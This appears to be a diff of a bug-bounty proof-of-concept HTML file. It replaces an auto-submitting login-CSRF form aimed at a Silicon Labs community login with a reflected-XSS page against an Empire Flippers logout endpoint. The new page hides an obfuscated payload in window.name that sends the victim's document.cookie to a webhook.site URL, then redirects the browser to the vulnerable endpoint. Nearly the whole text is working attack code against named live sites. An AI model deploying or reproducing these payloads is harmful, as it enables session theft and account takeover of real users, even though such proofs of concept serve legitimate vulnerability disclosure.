@@ -1,6 +1,16 @@
-<form action="https://community.silabs.com/SL_CommunitiesLogin" method="POST">
-    <input name="j_id0:form:username" value="attacker@evil.com">
-    <input name="j_id0:form:passwordBox" value="attackerPassword">
-    <input type="submit">
-</form>
-<script>document.forms[0].submit();</script>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS PoC - Empire Flippers</title>
+    <meta charset="UTF-8">
+  </head>
+  <body>
+    <script>
+      // Payload dentro do window.name (vai refletir no campo hs_context)
+      window.name = `<img src=x onerror=window['fet'+'ch']('https://webhook.site/eef1b76d-4e01-4f2a-ae89-f43530997756?cookie='+document['cook'+'ie'])">`;
+
+      // Redireciona para o endpoint vulnerável com o payload embedado
+      window.location.href = "https://app.empireflippers.com/logout?session=" + encodeURIComponent(window.name);
+    </script>
+  </body>
+</html>
